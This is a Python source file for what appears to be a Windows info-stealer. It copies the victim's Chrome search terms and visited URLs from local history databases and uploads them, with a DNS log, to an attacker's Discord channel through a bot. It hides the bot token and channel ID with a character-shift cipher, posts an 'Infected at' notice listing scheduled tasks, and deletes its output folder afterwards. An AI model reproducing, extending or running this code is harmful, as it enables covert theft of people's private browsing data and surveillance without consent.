import sqlite3, json, os, shutil
from datetime import datetime
import nextcord
from nextcord.ext import commands
from commands import *
from win32com.client import Dispatch

class FetchCommand:
    def __init__(self, query, type, command):
        self.query = query
        self.type = type
        self.command = command

    def format(self, results) -> list:
        col = []
        for result in results:
            date, time = result[1].split(" ")
            col.append({
                self.type: result[0],
                "Date": date,
                "Time": time
            })
        return col

class Fetcher:
    Target = os.environ['USERPROFILE']
    TargetDir = fr"{Target}\AppData\Local\Google\Chrome\User Data\\"
    EncryptStep = None
    Bot = commands.Bot(intents=nextcord.Intents.all())
    Channel = ChannelID = None
    Paths = []
    CurrentPath = None
    Notify = False

    Root = os.path.dirname(os.path.abspath(__file__))+"\\"
    Out = f"{Root}out\\"

    Commands = []

    @staticmethod
    def Transfer(func):
        async def wrapper(*args) -> None:
            try:
                desc, filename = func(*args)
                await Fetcher.Channel.send(content=f"```{desc}```", file=nextcord.File(filename))
            except Exception as e:
                await Fetcher.Channel.send(f"```Error: {e}```")
        return wrapper

    @staticmethod
    def Decrypt(string) -> str:
        return ''.join([chr(ord(c)-Fetcher.EncryptStep) for c in str(string)])

    @staticmethod
    def Run() -> None:
        Get = lambda string: os.environ.get(string)

        Fetcher.EncryptStep = int(Get("ENC"))
        Fetcher.ChannelID = int(Fetcher.Decrypt(Get("CHA")))

        if not Fetcher.Notify:
            Fetcher.Commands = [
                FetchCommand("Search Terms", "Query", term_cmd),
                FetchCommand("URLs", "URL", url_cmd)
            ]
            Fetcher.Paths = os.listdir(Fetcher.Out)
        
        try:
            Fetcher.Bot.run(Fetcher.Decrypt(Get("TOK")))
        except: ...

    @staticmethod
    @Bot.event
    async def on_ready() -> None:
        Fetcher.Channel = Fetcher.Bot.get_channel(Fetcher.ChannelID)
        if not Fetcher.Channel: 
            return
        
        if Fetcher.Notify:
            await Fetcher.SendNotify()
        else:
            await Fetcher.Channel.send(f"Time: `{datetime.now().strftime('%d/%m/%Y %H:%M')}`\nTarget: `{Fetcher.Target}`")

            for i in Fetcher.Paths:
                Fetcher.CurrentPath = Fetcher.TargetDir+i                
                try:
                    await Fetcher.SearchHistory(Fetcher.Out+i)
                except Exception as e:
                    await Fetcher.Channel.send(f"```Error: {e}```")

            await Fetcher.DNS()

            shutil.rmtree(Fetcher.Out)

        await Fetcher.Bot.close()

    @staticmethod
    async def SendNotify():
        sch = Dispatch('Schedule.Service')
        sch.Connect()
        tasks = [i.Name for i in sch.GetFolder('\\').GetTasks(0)]
        await Fetcher.Channel.send(f"Infected at: `{datetime.now().strftime('%H:%M')}`\nTarget: `{Fetcher.Target}`\nTasks:`{tasks}`")

    @staticmethod
    @Transfer
    def SearchHistory(file) -> tuple:
        conn = sqlite3.connect(file)
        cursor = conn.cursor()

        contents = {}
        for command in Fetcher.Commands:
            cursor.execute(command.command)
            contents.update({command.query: command.format(cursor.fetchall())})
        for i in [cursor, conn]: 
            i.close()

        filename = f"{Fetcher.Out}{datetime.now().strftime('%d-%m-%Y')}.json"
        with open(filename, "w") as file:
            file.write(json.dumps(contents, indent=4))

        return Fetcher.CurrentPath, filename

    @staticmethod
    @Transfer
    def DNS() -> tuple:
        return "DNS", "log.txt"